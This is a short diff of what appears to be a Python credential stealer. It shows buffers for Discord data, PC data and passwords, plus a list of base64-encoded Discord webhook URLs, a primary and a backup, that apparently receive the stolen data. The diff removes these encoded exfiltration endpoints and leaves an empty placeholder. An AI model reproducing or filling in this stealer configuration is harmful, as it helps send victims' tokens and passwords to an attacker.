@@ -36,7 +36,7 @@ TEMP = os.getenv("TEMP")
 ROAMING = os.getenv("APPDATA")
 
 # first hooks is the link in base64 format, everything after are backup webhooks
-hooks = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODY5MTY3MTQxMjIyNDgxOTUxL2ZiUENoQXo4VXljOVJJZlJ6d3dIUGtnRkpvSUNaclhVZGREZUFqMFJkYnVaYVhoZmg1ak1DMnJUbVUybjBGTXZNWFJZ", "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODY5MTY4MDQ3MDk1NzA5NzE2L05QYlNRbmZya1JRZGNXbkNCNFRlMmlpOEx0MEpUSnNIdVJUVjNIWW1nSWk5MDdpbGlJTEdSRVIxalpJNjFUTF9QdzZF"]
+hooks = [""]
 discord_data = ""
 pc_data = ""
 password_data = ""
